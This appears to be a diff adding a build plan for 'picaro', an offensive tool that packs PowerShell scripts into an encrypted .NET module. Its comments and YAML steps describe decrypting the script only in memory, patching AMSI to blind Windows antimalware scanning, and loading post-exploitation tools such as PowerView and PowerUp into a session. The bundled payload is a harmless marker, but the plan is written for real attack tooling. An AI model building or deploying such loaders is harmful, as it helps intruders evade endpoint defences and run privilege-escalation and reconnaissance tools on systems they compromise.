@@ -1,0 +1,33 @@
+# A PowerShell tool as an importable module: `Import-Module` injects the script's
+# functions into your session without the `.ps1` touching disk in the clear.
+#
+# The artifact is a managed (.NET) PowerShell **binary module** — not the native
+# stub — compiled from generated C#. Inside it the script is XChaCha20-Poly1305
+# ciphertext, decrypted in memory by the module's `OnImport`.
+#
+#   picaro build examples/plans/powershell-module.yaml
+#   powershell> Import-Module .\dist\picaro-psmodule.dll
+#   powershell> Get-PicaroMarker        -> picaro-ok
+#
+# Point `source` at a real tool (`powerview.ps1`, `PowerUp.ps1`, ...) to get its
+# functions in your session. Several tools: add one `import_powermodule` step
+# per `.ps1` (Plan C).
+
+schema: 6
+name: picaro-psmodule
+
+build:
+  payloads:
+    script:
+      source: ./examples/payloads/demo_script.ps1
+      format: powershell
+
+  output:
+    kind: psmodule
+    path: ./dist/picaro-psmodule.dll
+
+runtime:
+  - technique: patch_amsi
+  - technique: import_powermodule
+    params:
+      payload: script
